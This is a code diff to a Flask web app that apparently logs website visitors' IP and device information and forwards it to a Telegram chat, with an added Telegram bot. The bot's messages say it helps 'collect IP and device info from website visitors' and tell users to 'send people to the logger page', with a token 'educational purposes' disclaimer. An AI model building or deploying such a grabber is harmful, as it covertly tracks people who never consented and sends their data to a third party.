@@ -1,13 +1,13 @@
 from flask import Flask, request, render_template
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+import threading
 import requests
 from datetime import datetime
-import os
+from config import BOT_TOKEN, CHAT_ID
 
+# --- Flask App Setup ---
 app = Flask(__name__)
-
-# Get values from environment variables
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
 
 def send_telegram(msg):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -60,5 +60,40 @@ def log():
     send_telegram(msg)
     return {'status': 'ok'}
 
+def run_flask():
+    app.run(debug=True, use_reloader=False)
+
+# --- Telegram Bot Setup ---
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_html(
+        "<b>👋 Welcome to Logger Bot!</b>\n\n"
+        "This bot helps you collect IP and device info from website visitors.\n"
+        "📊 Use responsibly & only for educational purposes.\n\n"
+        "To get started, share your logger page.\n"
+        "Need help? Type /help"
+    )
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🛠 This bot works with your logger site.\n"
+        "Just send people to the logger page to collect data.\n"
+        "Use /start to see the intro again."
+    )
+
+def run_bot():
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    print("🤖 Telegram bot running...")
+    app.run_polling()
+
+# --- Main Run ---
 if __name__ == '__main__':
-    app.run(debug=True)
+    flask_thread = threading.Thread(target=run_flask)
+    bot_thread = threading.Thread(target=run_bot)
+
+    flask_thread.start()
+    bot_thread.start()
+
+    flask_thread.join()
+    bot_thread.join()
